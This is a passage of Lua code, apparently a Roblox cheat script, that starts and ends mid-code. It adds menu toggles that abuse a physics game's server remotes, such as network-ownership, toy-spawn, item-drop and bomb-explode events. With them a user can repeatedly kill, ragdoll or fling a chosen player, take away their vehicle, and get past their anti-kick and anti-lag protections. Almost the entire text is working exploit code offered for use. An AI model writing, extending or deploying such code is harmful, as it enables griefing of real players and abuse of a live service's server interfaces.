                                savedPos = myRoot.CFrame
                                startTime = nil
                                grabAttemptStartTime = nil
                                checkStartTime = nil
                            end
                            task.wait(0.1)
                            continue
                        end

                        myChar = LocalPlayer.Character
                        myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                        if not myRoot then 
                            task.wait()
                            continue 
                        end
                        
                        local tChar = target.Character
                        local tHum = tChar and tChar:FindFirstChild("Humanoid")
                        local tRoot = currentTargetRoot

                        if tRoot then
                            pcall(function()
                                SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                RunService.Stepped:Wait(0)
                                DestroyGrabLine:FireServer(tRoot)
                            end)
                            local limbs = {"Left Leg", "Right Leg", "Left Arm", "Right Arm", "Head", "Torso", "UpperTorso", "LowerTorso"}
                            for _, limbName in ipairs(limbs) do
                                local part = tChar:FindFirstChild(limbName)
                                if part then 
                                    part.Velocity = ZERO_VECTOR 
                                    part.RotVelocity = ZERO_VECTOR 
                                    part.CanCollide = false 
                                end
                            end
                        end

                        if not isGrabbing then
                            myRoot.CFrame = tRoot.CFrame * CFrame.new(0, -6, -10)
                            myRoot.Velocity = ZERO_VECTOR
                            if not grabAttemptStartTime then grabAttemptStartTime = tick() end
                            tHum.PlatformStand = true
                            tHum.Sit = false
                            if not startTime then startTime = tick() end
                            if tick() - startTime > 0.15 then
                                isGrabbing = true
                                startTime = nil
                                grabAttemptStartTime = nil
                                myRoot.CFrame = savedPos
                                myRoot.Velocity = ZERO_VECTOR
                                
                                local att0 = Instance.new("Attachment", tRoot)
                                local att1 = Instance.new("Attachment", myRoot)
                                att1.CFrame = CFrame.new(0, 12, 0)
                                
                                local ap = Instance.new("AlignPosition", tRoot)
                                ap.Attachment0 = att0 
                                ap.Attachment1 = att1
                                ap.MaxForce = math.huge 
                                ap.MaxVelocity = math.huge
                                ap.Responsiveness = 400
                                ap.ApplyAtCenterOfMass = true
                                
                                local ao = Instance.new("AlignOrientation", tRoot)
                                ao.Attachment0 = att0 
                                ao.Attachment1 = att1
                                ao.MaxTorque = math.huge 
                                ao.Responsiveness = 400
                                
                                attachments.att0 = att0 
                                attachments.att1 = att1
                                attachments.ap = ap 
                                attachments.ao = ao
                                tHum:ChangeState(Enum.HumanoidStateType.Physics)
                            end
                        else
                            if attachments.att1 then 
                                attachments.att1.CFrame = CFrame.new(0, 16.5, 0) 
                            end
                            
                            if not isTargetAlive() then
                                cleanupPhysicsObjects()
                                savedPos = myRoot.CFrame
                                myRoot.CFrame = savedPos
                                myRoot.Velocity = ZERO_VECTOR
                                task.wait(0.1)
                                continue
                            end
                            
                            tRoot = currentTargetRoot
                            if not checkStartTime then checkStartTime = tick() + 0.25 end
                            if checkStartTime and tick() >= checkStartTime then
                                local currentDistance = (myRoot.Position - tRoot.Position).Magnitude
                                if currentDistance > 29 then
                                    cleanupPhysicsObjects()
                                    isGrabbing = false
                                    startTime = tick()
                                    grabAttemptStartTime = nil
                                    checkStartTime = nil
                                    savedPos = myRoot.CFrame
                                    myRoot.CFrame = tRoot.CFrame * CFrame.new(0, -8, 0)
                                    myRoot.Velocity = ZERO_VECTOR
                                    pcall(function()
                                        SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                        DestroyGrabLine:FireServer(tRoot)
                                    end)
                                    task.wait()
                                    continue
                                end
                            end
                            
                            pcall(function()
                                SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                DestroyGrabLine:FireServer(tRoot)
                            end)
                            
                            local currentTime = tick()
                            if currentTime - lastPalletTime >= 0.01 then
                                lastPalletTime = currentTime
                                soundPart.CFrame = tRoot.CFrame * CFrame.new(0, 2, 0)
                                pcall(function()
                                    SetNetOwner:FireServer(soundPart, soundPart.CFrame)
                                end)
                                task.wait()
                                soundPart.CFrame = HIDDEN_CF
                            end
                        end
                        task.wait()
                    end
                    
                    cleanupPhysicsObjects()
                    if myRoot and savedPos then 
                        myRoot.CFrame = savedPos 
                    end
                end
            end)
        end
    })
end

do

    local modeOptions = {
        "Loop Kill",
        "Loop Banana Ragdoll",
        "Loop Snowball"
    }

    local selectedKillMode = "Loop Kill"
    local loopKillActive = false
    local loopKillTask = nil
    local loopKillConnections = {}

    local function cleanupConnections()
        for _, conn in ipairs(loopKillConnections) do
            pcall(function() conn:Disconnect() end)
        end
        loopKillConnections = {}
        if loopKillTask then
            task.cancel(loopKillTask)
            loopKillTask = nil
        end
        loopKillActive = false
        
        pcall(function()
            local cameraAnchor = getgenv().CameraAnchor
            if cameraAnchor and cameraAnchor.detach then
                cameraAnchor:detach()
            end
        end)
    end

    ChooseGroup:CreateDropdown({
        Name = "Select Loop Mode",
        Items = modeOptions,
        Default = "Loop Kill",
        Callback = function(Value)
            selectedKillMode = Value
        end
    })

    ChooseGroup:CreateToggle({
        Name = "Enable Loop",
        Default = false,
        Callback = function(Value)
            if not Value then
                cleanupConnections()
                return
            end

            if loopKillActive then
                cleanupConnections()
            end

            loopKillActive = Value

            if selectedKillMode == "Loop Kill" then
                local KillHB = nil
                local HEIGHT_LIMIT = 100000
                local TELEPORT_OFFSET = Vector3.new(6, -18.5, 0)

                local CameraAnchor = {}
                CameraAnchor.__index = CameraAnchor
                function CameraAnchor.new() return setmetatable({}, CameraAnchor) end
                function CameraAnchor:attach(cf)
                    self:detach()
                    local p = Instance.new("Part")
                    p.Name = "CameraAnchor"
                    p.Size = Vector3.new(0.2, 0.2, 0.2)
                    p.Transparency = 1
                    p.Anchored = true
                    p.CanCollide = false
                    p.CFrame = cf
                    p.Parent = workspace
                    self.part = p
                    local cam = workspace.CurrentCamera
                    cam.CameraType = Enum.CameraType.Custom
                    cam.CameraSubject = p
                end
                function CameraAnchor:detach()
                    if self.part then self.part:Destroy() self.part = nil end
                    local cam = workspace.CurrentCamera
                    local char = LocalPlayer.Character
                    if char and char:FindFirstChild("Humanoid") then
                        cam.CameraSubject = char.Humanoid
                    else
                        cam.CameraType = Enum.CameraType.Custom
                    end
                end
                local cameraAnchor = CameraAnchor.new()
                getgenv().CameraAnchor = cameraAnchor

                local function isTooHigh(plr)
                    local c = plr.Character
                    local hrp = c and c:FindFirstChild("HumanoidRootPart")
                    return not hrp or hrp.Position.Y > HEIGHT_LIMIT
                end

                local function setNoCollideChar(char)
                    for _, v in ipairs(char:GetDescendants()) do
                        if v:IsA("BasePart") then v.CanCollide = false end
                    end
                end

                local function saveOriginalPos()
                    local char = LocalPlayer.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if hrp then char:SetAttribute("OriginalPosition", hrp:GetPivot()) end
                end

                local function getOriginalPos()
                    local char = LocalPlayer.Character
                    return char and char:GetAttribute("OriginalPosition") or nil
                end

                local function scheduleReturnHome()
                    local originalPos = getOriginalPos()
                    if not originalPos then return end
                    local conn
                    conn = RunService.Heartbeat:Connect(function()
                        local char = LocalPlayer.Character
                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            hrp:PivotTo(originalPos)
                            if getgenv().originalFallenHeight then
                                workspace.FallenPartsDestroyHeight = getgenv().originalFallenHeight
                            end
                            char:SetAttribute("SavingOriginalPos", false)
                        end
                        cameraAnchor:detach()
                        conn:Disconnect()
                    end)
                end

                local function findBlobman()
                    local toys = workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                    return toys and toys:FindFirstChild("CreatureBlobman") or nil
                end

                local function ensureBlobman()
                    local b = findBlobman()
                    if b then return b end
                    ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(
                        "CreatureBlobman",
                        LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5),
                        Vector3.new(0, -15, 0)
                    )
                    for _ = 1, 30 do
                        task.wait(0.1)
                        b = findBlobman()
                        if b then return b end
                    end
                    return nil
                end

                local function modifyTarget(root, hum)
                    if not (root and hum) or hum.Health <= 0 then return end
                    local blob = ensureBlobman()
                    if blob and blob:FindFirstChild("BlobmanSeatAndOwnerScript") then
                        local drop = blob.BlobmanSeatAndOwnerScript:FindFirstChild("CreatureDrop")
                        if drop then
                            for _, part in ipairs(hum.Parent:GetDescendants()) do
                                if part:IsA("Weld") or part:IsA("BallSocketConstraint") then
                                    drop:FireServer(part, part)
                                end
                            end
                        end
                    end
                    hum.Sit = false
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                    hum:ChangeState(Enum.HumanoidStateType.GettingUp)

                    local plr = Players:GetPlayerFromCharacter(hum.Parent)
                    if plr and plr:FindFirstChild("IsHeld") then plr.IsHeld.Value = false end
                    local rag = hum:FindFirstChild("Ragdolled")
                    if rag then rag.Value = false end

                    local bv = Instance.new("BodyVelocity")
                    local bav = Instance.new("BodyAngularVelocity")
                    bv.MaxForce = Vector3.new(1e7, -1e7, 1e7)
                    bv.P = 1e6
                    bv.Velocity = Vector3.new(math.random(-500, 50), -50, math.random(-50, 50))
                    bav.MaxTorque = Vector3.new(-1e7, -1e7, -1e7)
                    bav.P = 1e6
                    bav.AngularVelocity = Vector3.new(math.random(-500, 300), math.random(-300, 300), math.random(-500, 500))
                    bv.Parent = root
                    bav.Parent = root
                    hum.BreakJointsOnDeath = false
                    hum:ChangeState(Enum.HumanoidStateType.Dead)
                    task.delay(2, function()
                        if bv.Parent then bv:Destroy() end
                        if bav.Parent then bav:Destroy() end
                    end)
                end

                local function performKill()
                    if not selectedKickPlayer then return end
                    local target = selectedKickPlayer
                    local tChar = target and target.Character
                    local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                    local tHum = tChar and tChar:FindFirstChild("Humanoid")
                    local tHead = tChar and tChar:FindFirstChild("Head")
                    
                    if not (target and tRoot and tHum and tHead) then return end
                    if isTooHigh(target) then return end
                    if tHum:GetState() == Enum.HumanoidStateType.Dead then return end

                    local char = LocalPlayer.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if not (char and hrp) then return end

                    if not char:GetAttribute("SavingOriginalPos") then
                        saveOriginalPos()
                    end
                    char:SetAttribute("SavingOriginalPos", true)
                    getgenv().originalFallenHeight = workspace.FallenPartsDestroyHeight
                    workspace.FallenPartsDestroyHeight = 0/0

                    local originalPos = getOriginalPos()
                    if originalPos then cameraAnchor:attach(originalPos) end

                    hrp:PivotTo(CFrame.new(tRoot.Position + TELEPORT_OFFSET))
                    setNoCollideChar(tChar)
                    ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(tRoot, tRoot.CFrame)
                    task.wait(0.05)
                    ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(tRoot)
                    task.wait(0.05)

                    if tHead:FindFirstChild("PartOwner") and tHead.PartOwner.Value == LocalPlayer.Name then
                        task.wait(0.05)
                        modifyTarget(tRoot, tHum)
                    end
                    scheduleReturnHome()
                end

                KillHB = RunService.Heartbeat:Connect(performKill)
                loopKillConnections = {KillHB}

            elseif selectedKillMode == "Loop Banana Ragdoll" then
                local bool = {LoopRagdoll = false}
                local etc = {}

                loopKillTask = task.spawn(function()
                    bool.LoopRagdoll = true
                    
                    local function FWD(parent, part, time)
                        return parent:FindFirstChild(part) or parent:WaitForChild(part, time or 5)
                    end

                    local function CFP(parent, part)
                        return parent:FindFirstChild(part) ~= nil  
                    end

                    local function sno(part) 
                        pcall(function() ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(part, part.CFrame) end)
                    end

                    local function unsno(part) 
                        pcall(function() ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(part) end)
                    end

                    local function CheckNetworkOwnerOnPart(Part) 
                        return CFP(Part, "PartOwner") and Part:FindFirstChild("PartOwner").Value == LocalPlayer.Name
                    end

                    local function SpawnToy(ToyName)
                        local InPlot = LocalPlayer:FindFirstChild("InPlot")
                        local InOwnedPlot = LocalPlayer:FindFirstChild("InOwnedPlot")
                        local CanSpawnToy = LocalPlayer:FindFirstChild("CanSpawnToy")

                        if InPlot and InPlot.Value and InOwnedPlot and not InOwnedPlot.Value then 
                            InPlot:GetPropertyChangedSignal("Value"):Wait()
                        end 
                        if CanSpawnToy and not CanSpawnToy.Value then 
                            CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
                        end

                        local currentHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if not currentHRP then return nil end

                        local SpawnCF = currentHRP.CFrame * CFrame.new(0, 14, 20)
                        local Container = workspace:FindFirstChild(LocalPlayer.Name.."SpawnedInToys")
                        
                        if not Container then return nil end

                        local spawnedObject = nil
                        local connection
                        connection = Container.ChildAdded:Connect(function(child)
                            if child.Name == ToyName then
                                spawnedObject = child
                            end
                        end)

                        task.spawn(function()
                            pcall(function()
                                ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(ToyName, SpawnCF, Vector3.zero)
                            end)
                        end)

                        local start = tick()
                        repeat task.wait() until spawnedObject or (tick() - start) > 2.5

                        if connection then connection:Disconnect() end
                        return spawnedObject
                    end

                    local targetPlayerName = selectedKickPlayer and selectedKickPlayer.Name
                    etc.TargetPLR = targetPlayerName and Players:FindFirstChild(targetPlayerName)
                    
                    if not etc.TargetPLR then 
                        Library:Notify({ Title = "System", Description = "Error: Target does not exist!", Duration = 3 })
                        return 
                    end 
                    
                    etc.Root = etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Left Leg")
                    local AlignPos
                    local AtachNew
                    
                    while bool.LoopRagdoll and loopKillActive and task.wait() do 
                        etc.Root = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild("Left Leg")
                        if not etc.Root then continue end 
                        
                        local inv = workspace:FindFirstChild(LocalPlayer.Name.."SpawnedInToys")
                        if not inv then continue end

                        local banana = inv:FindFirstChild("FoodBanana")
                        local SoundPart = banana and banana:FindFirstChild("SoundPart")
                        
                        if not SoundPart then 
                            for _, v in pairs(inv:GetChildren()) do 
                                if v.Name == "FoodBanana" then 
                                    pcall(function() ReplicatedStorage.MenuToys.DestroyToy:FireServer(v) end)
                                end 
                            end 
                            
                            banana = SpawnToy("FoodBanana")
                            if not banana then continue end
                            
                            SoundPart = FWD(banana, "SoundPart", 5)
                            if not SoundPart then continue end
                            
                            local holdPart = FWD(banana, "HoldPart", 5)
                            if holdPart then
                                local holdRemote = FWD(holdPart, "HoldItemRemoteFunction", 5)
                                if holdRemote then
                                    pcall(function() holdRemote:InvokeServer(banana, LocalPlayer.Character) end)
                                end
                            end

                            while CFP(banana, "EdiblePart") and bool.LoopRagdoll do task.wait() end

                            if holdPart then
                                local dropRemote = FWD(holdPart, "DropItemRemoteFunction", 5)
                                if dropRemote and LocalPlayer.Character then
                                    pcall(function() dropRemote:InvokeServer(banana, LocalPlayer.Character:GetPivot() * CFrame.new(0, 15, -10), Vector3.zero) end)
                                end
                            end
                            
                            repeat 
                                task.wait(0.01)
                                SoundPart = banana and banana:FindFirstChild("SoundPart")
                                if not SoundPart then break end 
                                sno(SoundPart)
                            until not SoundPart or CFP(SoundPart, "PartOwner") or not bool.LoopRagdoll
                            
                            unsno(SoundPart)
                            local Atach = Instance.new("Attachment")
                            Atach.Parent = SoundPart
                            
                            AlignPos = Instance.new("AlignPosition")
                            AlignPos.Responsiveness = 100
                            AlignPos.Parent = SoundPart
                            AlignPos.Attachment0 = Atach
                        end
                        
                        for _, v in pairs(banana:GetChildren()) do 
                            if CFP(v, "PartOwner") and not CheckNetworkOwnerOnPart(v) then 
                                pcall(function() ReplicatedStorage.MenuToys.DestroyToy:FireServer(banana) end) 
                                banana = nil 
                                break 
                            end
                        end
                        
                        if not banana then continue end 
                        AlignPos = SoundPart:FindFirstChild("AlignPosition")
                        
                        if not AlignPos then 
                            pcall(function() ReplicatedStorage.MenuToys.DestroyToy:FireServer(banana) end) 
                            banana = nil 
                            continue 
                        end
                        
                        AtachNew = etc.Root and etc.Root:FindFirstChild("LeftFootAttachment")
                        if not AtachNew then continue end 
                        AlignPos.Attachment1 = AtachNew
                    end 
                    
                    pcall(function()
                        local inv = workspace:FindFirstChild(LocalPlayer.Name.."SpawnedInToys")
                        local banana = inv and inv:FindFirstChild("FoodBanana")
                        if banana then 
                            local SoundPart = banana:FindFirstChild("SoundPart")
                            local AlignPos = SoundPart and SoundPart:FindFirstChild("AlignPosition")
                            if AlignPos then AlignPos:Destroy() end 
                            ReplicatedStorage.MenuToys.DestroyToy:FireServer(banana)
                        end
                    end)
                end)

            elseif selectedKillMode == "Loop Snowball" then
                loopKillTask = task.spawn(function()
                    local Remotes = {
                        SpawnToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction"),
                        SetNetOwner = ReplicatedStorage:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner"),
                        BombExplode = ReplicatedStorage:WaitForChild("BombEvents"):WaitForChild("BombExplode")
                    }

                    while loopKillActive do
                        local targetSource = selectedKickPlayer
                        local targetName = nil
                        
                        if typeof(targetSource) == "Instance" and targetSource:IsA("Player") then
                            targetName = targetSource.Name
                        elseif typeof(targetSource) == "string" then
                            targetName = targetSource:match("@(.-)%)") or targetSource
                        end

                        local target = targetName and Players:FindFirstChild(targetName)
                        if not target or not target.Character then
                            task.wait(0.1)
                            continue 
                        end

                        local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
                        if not tRoot then 
                            task.wait(0.1)
                            continue 
                        end

                        local char = LocalPlayer.Character
                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
                        if not hrp then 
                            task.wait(0.1)
                            continue 
                        end

                        local inv = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                        if not inv then 
                            task.wait(0.1)
                            continue 
                        end

                        local ball = inv:FindFirstChild("BallSnowball")
                        if not ball then
                            task.spawn(function()
                                pcall(function() 
                                    Remotes.SpawnToy:InvokeServer("BallSnowball", hrp.CFrame * CFrame.new(0, 10, 20), Vector3.zero) 
                                end)
                            end)
                            task.wait(0.15)
                        else
                            local SoundPart = ball:FindFirstChild("SoundPart")
                            if SoundPart then
                                pcall(function() Remotes.SetNetOwner:FireServer(SoundPart, SoundPart.CFrame) end)
                                task.wait(0.05)

                                SoundPart.CFrame = tRoot.CFrame
                                task.wait(0.05)

                                local payload = {
                                    Radius = 0,
                                    Color = Color3.new(0, 0, 0),
                                    TimeLength = 0,
                                    Model = ball,
                                    Type = "SnowPoof",
                                    ExplodesByFire = false,
                                    MaxForcePerStudSquared = 0,
                                    Hitbox = SoundPart,
                                    ImpactSpeed = 0,
                                    ExplodesByPointy = false,
                                    DestroysModel = true,
                                    PositionPart = SoundPart
                                }
                                
                                pcall(function() Remotes.BombExplode:FireServer(payload, Vector3.zero) end)
                                task.wait(0.15)
                            else
                                task.wait(0.1)
                            end
                        end
                    end
                end)
            end
        end
    })
end

game:GetService("UserInputService").InputBegan:Connect(function(input, processed)
	if not processed and input.KeyCode == Enum.KeyCode.T and _G.AutoSitBlobT then
		local plr = game.Players.LocalPlayer
		local char = plr.Character
		local hrp = char and char:FindFirstChild("HumanoidRootPart")
		local hum = char and char:FindFirstChild("Humanoid")
		if not hrp or not hum then
			return
		end
		local folderName = plr.Name .. "SpawnedInToys"
		local folder = workspace:FindFirstChild(folderName)
		local blob = folder and folder:FindFirstChild("CreatureBlobman")
		if not blob then
			task.spawn(function()
				pcall(function()
					game.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", hrp.CFrame, Vector3.zero)
				end)
			end)
			if not folder then
				folder = workspace:WaitForChild(folderName, 5)
			end
			if folder then
				blob = folder:WaitForChild("CreatureBlobman", 5)
			end
		end
		if blob then
			local seat = blob:WaitForChild("VehicleSeat", 5)
			if seat then
				local t = tick()
				repeat
					if not hum.SeatPart then
						hrp.CFrame = seat.CFrame + Vector3.new(0, 1, 0)
						hrp.Velocity = Vector3.zero
						seat:Sit(hum)
					end
					game:GetService("RunService").Heartbeat:Wait()
				until hum.SeatPart == seat or tick() - t > 1.5
			end
		end
	end
end)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if not gameProcessed and input.KeyCode == Enum.KeyCode.R then
		if blobMasterSwitch then
			blobFlyActive = not blobFlyActive
			if not blobFlyActive then
				if bvInstance then
					bvInstance:Destroy()
					bvInstance = nil
				end
				if bgInstance then
					bgInstance:Destroy()
					bgInstance = nil
				end
			end
		end
	end
end)
local function GetBlobRoot()
	local char = Player.Character
	local hum = char and char:FindFirstChild("Humanoid")
	if hum and hum.SeatPart and hum.SeatPart.Parent and hum.SeatPart.Parent.Name == "CreatureBlobman" then
		return hum.SeatPart.Parent:FindFirstChild("HumanoidRootPart") or hum.SeatPart.Parent.PrimaryPart
	end
	local folder = workspace:FindFirstChild(Player.Name .. "SpawnedInToys")
	if folder then
		local blob = folder:FindFirstChild("CreatureBlobman")
		if blob then
			return blob:FindFirstChild("HumanoidRootPart") or blob.PrimaryPart
		end
	end
	return nil
end
game:GetService("RunService").Heartbeat:Connect(function()
	if not blobFlyActive or not blobMasterSwitch then
		if bvInstance then
			bvInstance:Destroy()
			bvInstance = nil
		end
		if bgInstance then
			bgInstance:Destroy()
			bgInstance = nil
		end
		return
	end
	local root = GetBlobRoot()
	if root then
		if not root:FindFirstChild("BlobFlyVelocity") then
			bvInstance = Instance.new("BodyVelocity")
			bvInstance.Name = "BlobFlyVelocity"
			bvInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			bvInstance.P = 10000
			bvInstance.Parent = root
		else
			bvInstance = root.BlobFlyVelocity
		end
		if not root:FindFirstChild("BlobFlyGyro") then
			bgInstance = Instance.new("BodyGyro")
			bgInstance.Name = "BlobFlyGyro"
			bgInstance.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bgInstance.P = 20000
			bgInstance.D = 100
			bgInstance.Parent = root
		else
			bgInstance = root.BlobFlyGyro
		end
		local cam = workspace.CurrentCamera
		local moveDir = Vector3.zero
		if UserInputService:IsKeyDown(Enum.KeyCode.W) then
			moveDir = moveDir + cam.CFrame.LookVector
		end
		if UserInputService:IsKeyDown(Enum.KeyCode.S) then
			moveDir = moveDir - cam.CFrame.LookVector
		end
		if UserInputService:IsKeyDown(Enum.KeyCode.A) then
			moveDir = moveDir - cam.CFrame.RightVector
		end
		if UserInputService:IsKeyDown(Enum.KeyCode.D) then
			moveDir = moveDir + cam.CFrame.RightVector
		end
		if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
			moveDir = moveDir + Vector3.new(0, 1, 0)
		end
		if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
			moveDir = moveDir - Vector3.new(0, 1, 0)
		end
		if bvInstance then
			bvInstance.Velocity = moveDir * blobFlySpeed
		end
		if bgInstance then
			bgInstance.CFrame = cam.CFrame
		end
	else
		if bvInstance then
			bvInstance:Destroy()
			bvInstance = nil
		end
		if bgInstance then
			bgInstance:Destroy()
			bgInstance = nil
		end
	end
end)
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

local destroyGucciActive = false
local ATTEMPT_TIME = 0.9
local COOLDOWN = 0.45

local function getHumanoid(player)
    local character = player and player.Character
    return character and character:FindFirstChildOfClass("Humanoid")
end

local function getTargetPlayer()
    if selectedKickPlayer and selectedKickPlayer.Parent then
        return selectedKickPlayer
    end
    if selectedPlrName then
        return Players:FindFirstChild(selectedPlrName)
    end
    return nil
end

TargetGroup:CreateToggle({
    Name = "Destroy Gucci (sit)",
    Flag = "DestroyGucciSit",
    Default = false,
    Callback = function(Value)
        destroyGucciActive = Value
        
        if Value then
            local target = getTargetPlayer()
            if not target then
                Library:Notify({
                    Title = "Error",
                    Content = "Select target first!",
                    Duration = 3
                })
                destroyGucciActive = false
                return
            end
            
            task.spawn(function()
                while destroyGucciActive do
                    local target = getTargetPlayer()
                    if not target or not target.Parent then
                        Library:Notify({
                            Title = "System",
                            Content = "Target left the game!",
                            Duration = 3
                        })
                        destroyGucciActive = false
                        break
                    end
                    
                    local myCharacter = LocalPlayer.Character
                    local myHumanoid = myCharacter and myCharacter:FindFirstChildOfClass("Humanoid")
                    local myRoot = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
                    local targetHumanoid = getHumanoid(target)
                    
                    if not myHumanoid or not myRoot or not targetHumanoid then
                        task.wait(0.5)
                        continue
                    end
                    
                    local targetSeat = targetHumanoid.SeatPart
                    
                    if targetSeat and targetSeat:IsA("Seat") then
                        local returnCFrame = myRoot.CFrame
                        
                        if myHumanoid.SeatPart ~= targetSeat then
                            local magnetConnection = RunService.Stepped:Connect(function()
                                if not destroyGucciActive or not targetSeat.Parent or not myRoot.Parent then
                                    return
                                end
                                myRoot.CFrame = targetSeat.CFrame
                                myRoot.AssemblyLinearVelocity = Vector3.zero
                                if targetSeat.Parent and targetSeat.Parent.PrimaryPart then
                                    targetSeat.Parent.PrimaryPart.AssemblyLinearVelocity = Vector3.zero
                                    targetSeat.Parent.PrimaryPart.AssemblyAngularVelocity = Vector3.zero
                                end
                            end)
                            
                            local deadline = os.clock() + ATTEMPT_TIME
                            
                            while destroyGucciActive and os.clock() < deadline and targetSeat.Parent and myHumanoid.SeatPart ~= targetSeat do
                                pcall(function()
                                    targetSeat:Sit(myHumanoid)
                                end)
                                task.wait()
                            end
                            
                            magnetConnection:Disconnect()
                            
                            if myHumanoid.SeatPart == targetSeat then
                                task.wait(0.15)
                                myHumanoid.Sit = false
                                myHumanoid.Jump = true
                                task.wait(0.05)
                                
                                if myRoot.Parent then
                                    myRoot.CFrame = returnCFrame
                                    myRoot.AssemblyLinearVelocity = Vector3.zero
                                end
                                
                                Library:Notify({
                                    Title = "Success",
                                    Content = target.DisplayName .. "'s vehicle has been removed!",
                                    Duration = 3
                                })
                                task.wait(0.5)
                            else
                                if myRoot.Parent then
                                    myRoot.CFrame = returnCFrame
                                end
                            end
                        end
                    end
                    
                    task.wait(COOLDOWN)
                end
            end)
        end
    end
})

	--// Allowed items
local AllowedItems = {
    -- Food
	FoodHamburger = true,
	FoodCoconut = true,
	FoodPizzaCheese = true,
	FoodPizzaPepperoni = true,
	FoodHotdog = true,
	FoodMushroomPoison = true,
	FoodBread = true,
	FoodDippyEgg = true,
	FoodMayonnaise = true,
	FoodFrenchFries = true,
	FoodMeatStick = true,
	FoodDonut = true,
	FoodCakePink = true,

    -- Instruments
	InstrumentGuitarBanjo = true,
	InstrumentGuitarViolin = true,
	InstrumentGuitarUkulele = true,
	InstrumentWoodwindSaxophone = true,
	InstrumentWoodwindOcarina = true,
	InstrumentBrassVuvuzelaQwizik = true,
	InstrumentBrassTrumpet = true,
	InstrumentDrumBongos = true,
	InstrumentDrumSnare = true,
	InstrumentPianoMelodica = true,
	InstrumentVoiceMicrophone = true,

    -- Cups
	CupMugWhite = true,
	CupMugBrown = true,

    -- Poop
	PoopPile = true,
	PoopPileSparkle = true,
}

local antiAntiLagEnabled = false

TargetGroup:CreateToggle({
	Name = "Remove Anti Input Lag",
        Flag = "Remove Anti Input Lag",
	Default = false,
	Callback = function(on)
        SetToggleState("Remove Anti Input Lag", on)
		antiAntiLagEnabled = on
		if not on then
			antiAntiLagEnabled = false
			return
		end
		task.spawn(function()
			local plr = game.Players.LocalPlayer
			local char = plr.Character
			local hrp = char:FindFirstChild("HumanoidRootPart")
			if not hrp then
				return
			end
			local burgers = {}
			for _, v in ipairs(workspace:GetDescendants()) do
				if AllowedItems[v.Name] and v:IsA("Model") and v:FindFirstChild("HoldPart") then
					burgers[#burgers + 1] = v
				end
			end
			workspace.DescendantAdded:Connect(function(obj)
				if AllowedItems[obj.Name] and obj:IsA("Model") then
					task.spawn(function()
						local hp = obj:WaitForChild("HoldPart", 3)
						if hp then
							burgers[#burgers + 1] = obj
						end
					end)
				end
			end)
			while antiAntiLagEnabled do
				for i = #burgers, 1, -1 do
					local b = burgers[i]
					if not b or not b.Parent or not b:FindFirstChild("HoldPart") then
						table.remove(burgers, i)
					else
						local hp = b.HoldPart
						pcall(function()
							hp.HoldItemRemoteFunction:InvokeServer(b, char)
						end)
						task.wait()
						pcall(function()
							hp.DropItemRemoteFunction:InvokeServer(
                                b,
                                CFrame.new(hrp.Position + Vector3.new(0, -2000, 0)),
                                Vector3.new(0, 0, 0)
                            )
						end)
					end
				end
				task.wait()
			end
		end)
	end
})
do

    local modeOptions = {
        "Anti-AntiKick CLICK",
        "Anti-AntiKick BYPASS"
    }

    local selectedAntiMode = "Anti-AntiKick CLICK"
    local antiActive = false
    local antiTask = nil

    local function cleanupAnti()
        if antiTask then
            task.cancel(antiTask)
            antiTask = nil
        end
        antiActive = false
    end

    TargetGroup:CreateDropdown({
        Name = "Select Anti-AntiKick Mode",
        Items = modeOptions,
        Default = "Anti-AntiKick CLICK",
        Callback = function(Value)
            selectedAntiMode = Value
        end
    })

    TargetGroup:CreateToggle({
        Name = "Enable Anti-AntiKick",
        Default = false,
        Callback = function(Value)
            if not Value then
                cleanupAnti()
                return
            end

            if antiActive then
                cleanupAnti()
            end

            antiActive = Value

            local Players = game:GetService("Players")
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local LocalPlayer = Players.LocalPlayer

            local GrabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
            local SetNetOwner = GrabEvents and GrabEvents:FindFirstChild("SetNetworkOwner")
            local PlayerEvents = ReplicatedStorage:FindFirstChild("PlayerEvents")
            local StickyEvent = PlayerEvents and PlayerEvents:FindFirstChild("StickyPartEvent")

            local function sno(part)
                if SetNetOwner and part then
                    pcall(function() SetNetOwner:FireServer(part, part.CFrame) end)
                end
            end

            local function CheckNetworkOwnerOnPart(part)
                local owner = part:FindFirstChild("PartOwner")
                return owner and owner.Value == LocalPlayer.Name
            end

            local function GetMagnitude(part1, part2)
